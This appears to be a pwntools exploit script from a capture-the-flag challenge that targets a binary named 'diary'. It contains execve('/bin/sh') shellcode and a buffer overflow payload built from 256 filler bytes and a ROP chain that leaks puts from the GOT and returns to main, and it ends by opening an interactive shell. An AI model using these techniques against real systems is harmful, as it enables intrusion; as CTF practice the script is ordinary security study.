#!/usr/bin/env python3

from pwn import *

elf = ELF("./diary")
libc = elf.libc

context.binary = elf

gdbscript='''
break *0x00000000004012aa
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def main():
    r = conn()
    #r = remote('challs.tfcctf.com',32484)
    shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')   
    shellcode2 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" 
    #print(f"len of shell: {len(shellcode)}") 
    var_addr = 0x401164
    # offset - 264
    ret = 0x40101a
    #payload = shellcode2 + cyclic(241) + pack(0x7ffd3057f000 + 0x1e950)
    #r.sendline(b"A"*256 + pack(0xdeadbeef) + pack(0x0401147) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main))
    r.sendline(b"A"*256 + pack(elf.got.puts) + pack(0x040114d) + pack(elf.sym.puts) + pack(elf.sym.main))
    #r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()

